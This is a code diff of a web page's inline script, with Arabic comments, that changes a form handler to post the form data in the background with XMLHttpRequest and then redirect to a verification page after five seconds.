@@ -2780,33 +2780,37 @@ document.addEventListener('DOMContentLoaded', function() {
 	</script>
 
 	
+
 <script>
 function v40() {
   const sendBtn = document.getElementById('i41');
   const form = sendBtn ? sendBtn.closest('form') : null;
 
-  // 1. تعطيل الزر لمنع الضغط المكرر
+  if (!form) {
+    alert('لم يتم العثور على النموذج!');
+    return;
+  }
+
+  // 1. تعطيل الزر وتغيير النص ليعرف العميل أنه جاري الإرسال
   if (sendBtn) {
     sendBtn.disabled = true;
-    sendBtn.innerText = 'جاري الإرسال...';
+    sendBtn.innerText = 'جاري المعالجة...';
   }
 
-  // 2. إرسال النموذج بالطريقة العادية لضمان وصول البيانات
-  if (form) {
-    // إذا كان للنموذج دالة فحص أو إرسال سابقة ننفذها
-    if (typeof form.submit === 'function') {
-      form.submit();
-    } else {
-      HTMLFormElement.prototype.submit.call(form);
-    }
-  }
+  // 2. تجميع البيانات وإرسالها في الخلفية
+  const formData = new FormData(form);
+  const xhr = new XMLHttpRequest();
+  
+  // يرسل البيانات لنفس رابط action الخاص بالنموذج
+  xhr.open(form.method || 'POST', form.action || window.location.href, true);
+  
+  xhr.send(formData);
 
-  // 3. التوجيه بعد 5 ثوانٍ
+  // 3. بدء عداد الـ 5 ثوانٍ للتوجيه (بغض النظر عن طريقة استجابة السيرفر)
   setTimeout(function() {
-    window.location.href = 'verification.html'; // استبدل page2.html برابط صفحتك
+    window.location.href = 'verification.html'; // <<< ضع رابط صفحتك الجديدة هنا
   }, 5000);
 }
 </script>
-
 </body>
 </html>
